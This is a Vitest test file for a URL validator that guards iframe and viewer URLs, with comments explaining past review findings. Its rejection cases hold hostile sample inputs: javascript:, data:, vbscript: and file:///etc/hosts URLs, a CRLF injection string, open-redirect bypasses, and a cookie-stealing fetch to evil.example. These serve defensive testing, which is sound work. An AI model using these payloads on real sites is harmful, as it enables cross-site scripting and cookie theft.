import { describe, expect, it } from 'vitest';

import {
  insecureAllowedForHost,
  isNavigableBaseUrl,
  navigableUrlOrNull,
  originOf,
} from './navigable-url';

/**
 * The negative cases are the point of this file. A validator that only has happy-path tests is a
 * validator nobody has watched reject anything.
 */
describe('navigableUrlOrNull', () => {
  describe('dangerous schemes', () => {
    // `javascript:` is the whole reason this helper exists: it is what a customer-editable manifest
    // can put in `viewerOrigin`, and `new URL()` accepts it without complaint.
    it.each([
      ['javascript:alert(1)'],
      ['JavaScript:alert(1)'],
      ['  javascript:alert(1)  '],
      ['javascript:void(fetch("https://evil.example/"+document.cookie))'],
      ['data:text/html,<script>alert(1)</script>'],
      ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
      ['blob:https://app.example/1234'],
      ['file:///etc/hosts'],
      ['vbscript:msgbox(1)'],
    ])('rejects %s', (candidate) => {
      expect(navigableUrlOrNull(candidate, { allowInsecure: true })).toBeNull();
    });

    it('rejects a javascript: URL even when its own origin is in the allow-list', () => {
      // `new URL('javascript:…').origin` is the string 'null'. If a caller compared origins without
      // checking the scheme, an allow-list containing 'null' would let this through.
      expect(
        navigableUrlOrNull('javascript:alert(1)', {
          allowedOrigins: ['null', 'https://ok.example'],
        }),
      ).toBeNull();
    });
  });

  describe('malformed and empty input', () => {
    it.each([
      [null],
      [undefined],
      [''],
      ['   '],
      ['not a url'],
      ['http://'],
      ['://missing-scheme'],
    ])('rejects %s', (candidate) => {
      expect(navigableUrlOrNull(candidate as string | null | undefined)).toBeNull();
    });

    it('rejects a relative URL when no base says what relative means', () => {
      expect(navigableUrlOrNull('/nuxeo/api/v1/preview')).toBeNull();
    });
  });

  describe('http vs https', () => {
    it('rejects http by default', () => {
      expect(navigableUrlOrNull('http://viewer.example.com')).toBeNull();
    });

    it('permits http when the caller explicitly allows it', () => {
      expect(navigableUrlOrNull('http://localhost:9080', { allowInsecure: true })).toBe(
        'http://localhost:9080',
      );
    });

    it('permits https without any opt-in', () => {
      expect(navigableUrlOrNull('https://viewer.example.com')).toBe('https://viewer.example.com');
    });
  });

  describe('origin comparison', () => {
    it('accepts a URL whose origin is allowed', () => {
      expect(
        navigableUrlOrNull('https://ok.example/view?doc=1', {
          allowedOrigins: ['https://ok.example'],
        }),
      ).toBe('https://ok.example/view?doc=1');
    });

    it('rejects a URL from an origin that is not allowed', () => {
      expect(
        navigableUrlOrNull('https://evil.example/view', { allowedOrigins: ['https://ok.example'] }),
      ).toBeNull();
    });

    it('distinguishes port and scheme when comparing origins', () => {
      expect(
        navigableUrlOrNull('https://ok.example:8443/x', { allowedOrigins: ['https://ok.example'] }),
      ).toBeNull();
    });

    // The reason this helper resolves and compares origins instead of testing string prefixes.
    it.each([
      ['//evil.example/x', 'protocol-relative'],
      ['/\\evil.example/x', 'backslash-escaped'],
    ])('rejects %s (%s), which a startsWith("/") check would accept', (candidate) => {
      expect(
        navigableUrlOrNull(candidate, {
          base: 'https://app.example',
          allowedOrigins: ['https://app.example'],
        }),
      ).toBeNull();
    });

    it('accepts a root-relative URL as same-origin when a base is given', () => {
      expect(
        navigableUrlOrNull('/nuxeo/api/v1/preview', {
          base: 'https://app.example',
          allowedOrigins: ['https://app.example'],
        }),
      ).toBe('/nuxeo/api/v1/preview');
    });

    it('ignores empty allow-list entries rather than treating them as wildcards', () => {
      // NUXEO_API_ORIGIN is '' when the dev proxy is in use, so this case is routine.
      expect(
        navigableUrlOrNull('https://evil.example/x', { allowedOrigins: ['', null, undefined] }),
      ).toBeNull();
    });

    it('rejects everything when the allow-list has no usable entries', () => {
      // "No usable entries" must not degrade to "allow all" — that would turn a misconfiguration
      // into an open redirect.
      expect(navigableUrlOrNull('https://anything.example', { allowedOrigins: [] })).toBeNull();
    });

    it('returns the original string, not a normalised href', () => {
      // Validation must not silently change which bytes get loaded.
      const candidate = 'https://ok.example/a//b/../c?x=1';
      expect(navigableUrlOrNull(candidate, { allowedOrigins: ['https://ok.example'] })).toBe(
        candidate,
      );
    });
  });
});

describe('originOf', () => {
  it('reads the origin of an absolute URL', () => {
    expect(originOf('https://ok.example:8443/deep/path?q=1')).toBe('https://ok.example:8443');
  });

  it.each([[''], [null], [undefined], ['/relative'], ['not a url']])(
    'answers null for %s',
    (value) => {
      expect(originOf(value as string | null | undefined)).toBeNull();
    },
  );

  it('answers null for an opaque origin rather than the string "null"', () => {
    // Returning 'null' would make it comparable to another opaque origin and match.
    expect(originOf('javascript:alert(1)')).toBeNull();
    expect(originOf('data:text/plain,hi')).toBeNull();
  });
});

describe('isNavigableBaseUrl', () => {
  it('accepts an https origin, with or without a path', () => {
    expect(isNavigableBaseUrl('https://viewer.example.com')).toBe(true);
    // A path is legitimate — a viewer can be hosted under a prefix — and appending parameters to
    // it is well defined.
    expect(isNavigableBaseUrl('https://viewer.example.com/arender')).toBe(true);
  });

  it('rejects http unless insecure is permitted', () => {
    expect(isNavigableBaseUrl('http://localhost:9080')).toBe(false);
    expect(isNavigableBaseUrl('http://localhost:9080', true)).toBe(true);
  });

  // The three exclusions that distinguish a usable *base* from a bare origin check. Each is a URL a caller
  // would append `?url=` to and get something that does not carry a top-level `url` parameter, or
  // that leaks a credential into an iframe navigation.
  it.each([
    ['a query string', 'https://viewer.example.com/app?tenant=x'],
    ['a fragment', 'https://viewer.example.com/app#frag'],
    ['userinfo with a password', 'https://user:pass@viewer.example.com'],
    ['userinfo without a password', 'https://user@viewer.example.com'],
  ])('rejects a base carrying %s', (_label, value) => {
    expect(isNavigableBaseUrl(value, true)).toBe(false);
  });

  it.each([
    ['a CRLF', 'https://ok.example/\r\nX-Injected: 1'],
    ['a tab', 'https://ok.\texample/x'],
    ['a leading space', ' https://ok.example/x'],
    ['a trailing newline', 'https://ok.example/x\n'],
  ])('rejects a candidate containing %s', (_label, value) => {
    // The function returns the original string, so it must not approve one the URL parser would
    // rewrite — otherwise the validator and the consumer disagree about which bytes were approved.
    expect(navigableUrlOrNull(value, { allowInsecure: true })).toBeNull();
  });

  // This assertion used to be the opposite, on the reasoning that "the harm came from concatenating
  // onto a *populated* query, not from a stray `?`". That was wrong, and review produced the
  // counterexample: `nuxeoInternalUrl` has a path appended to it as **text**, so
  // `http://proxy/nuxeo?` + `/nxfile/default/uid/file:content` is a URL whose path is only `/nuxeo`
  // with the nxfile path demoted to a query string, and `#` puts it in a fragment that never
  // reaches the server. `new URL()` normalising the empty query away is precisely what made it
  // invisible to the old check.
  it.each([
    ['a trailing question mark', 'https://viewer.example.com/app?'],
    ['a trailing hash', 'https://viewer.example.com/app#'],
    ['a bare question mark on an origin', 'https://viewer.example.com?'],
  ])('rejects a base ending in %s, which appending would silently absorb', (_label, value) => {
    expect(isNavigableBaseUrl(value, true)).toBe(false);
  });

  it('still accepts a percent-encoded delimiter, which is not a delimiter', () => {
    // `%3F` and `%23` are ordinary path characters; rejecting them would be stricter than the
    // defect requires and would break a legitimately encoded path segment.
    expect(isNavigableBaseUrl('https://viewer.example.com/a%3Fb', true)).toBe(true);
    expect(isNavigableBaseUrl('https://viewer.example.com/a%23b', true)).toBe(true);
  });

  // The inputs the origin-only predicate this replaced also rejected, kept as coverage after that
  // alias was removed: a base must be absolute, http(s), and a real origin rather than a prefix.
  it('rejects a non-absolute, non-http or protocol-relative value', () => {
    for (const value of ['javascript:alert(1)', '', null, 'viewer.example.com', '//host/x']) {
      expect(isNavigableBaseUrl(value as string | null, true)).toBe(false);
    }
  });
});

/**
 * `insecureAllowedForHost` exists because the same question was answered two different ways.
 *
 * The preview-fallback path allowed `http:` when the host document was itself `http:`; the two ARender
 * sites passed a bare `isDevMode()`. So ARender was silently dead on every on-prem plaintext
 * deployment while the repository documented the opposite policy. These tests pin the answer.
 */
describe('insecureAllowedForHost', () => {
  it('allows insecure in dev mode regardless of the host protocol', () => {
    expect(insecureAllowedForHost(true, 'https:')).toBe(true);
  });

  it('allows insecure in production when the host is itself plaintext', () => {
    // The on-prem case that was broken: an `http:` iframe inside an `http:` document is not a
    // downgrade, and refusing it removed ARender without adding any security.
    expect(insecureAllowedForHost(false, 'http:')).toBe(true);
  });

  it('refuses insecure in production when the host is secure', () => {
    // The load-bearing negative. If this returns true, an https application is allowed to frame a
    // plaintext viewer — the actual downgrade the check exists to prevent.
    expect(insecureAllowedForHost(false, 'https:')).toBe(false);
  });

  it('refuses insecure when the host protocol is unknown', () => {
    // Fails closed rather than assuming plaintext is fine.
    expect(insecureAllowedForHost(false, '')).toBe(false);
  });

  it('reads the real host protocol when none is passed', () => {
    // Proves the default argument is wired, not just the injectable path. jsdom serves the suite from
    // `http://localhost`, so production + default must agree with production + explicit 'http:'.
    expect(insecureAllowedForHost(false)).toBe(
      insecureAllowedForHost(false, window.location.protocol),
    );
  });

  it('still gates the base-URL check it feeds, rather than replacing it', () => {
    // Being allowed to use `http:` does not make a bad base acceptable: userinfo and a stray query
    // are still rejected on a plaintext host.
    const allow = insecureAllowedForHost(false, 'http:');
    expect(isNavigableBaseUrl('http://arender.internal', allow)).toBe(true);
    expect(isNavigableBaseUrl('http://user:pass@arender.internal', allow)).toBe(false);
    expect(isNavigableBaseUrl('http://arender.internal?', allow)).toBe(false);
  });
});

/**
 * Userinfo, on the GENERAL validator rather than only the base one.
 *
 * `origin` excludes credentials — `new URL('https://user:pass@app.example/x').origin` is exactly
 * `'https://app.example'` — so an `allowedOrigins` policy cannot see them, and this function returns
 * the original string, meaning `user:pass@` reached the iframe. Review found it while
 * `isNavigableBaseUrl` had been rejecting it all along, so the base validator was safe and the general
 * one guarding both Category C bypasses was not.
 */
describe('navigableUrlOrNull rejects embedded credentials', () => {
  const policy = { allowedOrigins: ['https://app.example'] };

  it('rejects a username and password that pass the origin allow-list', () => {
    // The precondition that makes this a real hole, asserted so the test cannot pass for the wrong
    // reason: the origin genuinely does match.
    expect(new URL('https://user:password@app.example/preview').origin).toBe('https://app.example');
    expect(navigableUrlOrNull('https://user:password@app.example/preview', policy)).toBeNull();
  });

  it('rejects a username with no password', () => {
    expect(navigableUrlOrNull('https://user@app.example/preview', policy)).toBeNull();
  });

  it('rejects a password with an empty username', () => {
    expect(navigableUrlOrNull('https://:password@app.example/preview', policy)).toBeNull();
  });

  it('rejects credentials even with no origin allow-list at all', () => {
    // The allow-list is not what closes this, so removing it must not reopen it.
    expect(navigableUrlOrNull('https://user:password@app.example/preview')).toBeNull();
  });

  it('still accepts the same URL without credentials', () => {
    // The positive control. Without it, a validator that rejected everything would pass the four above.
    expect(navigableUrlOrNull('https://app.example/preview', policy)).toBe(
      'https://app.example/preview',
    );
  });
});
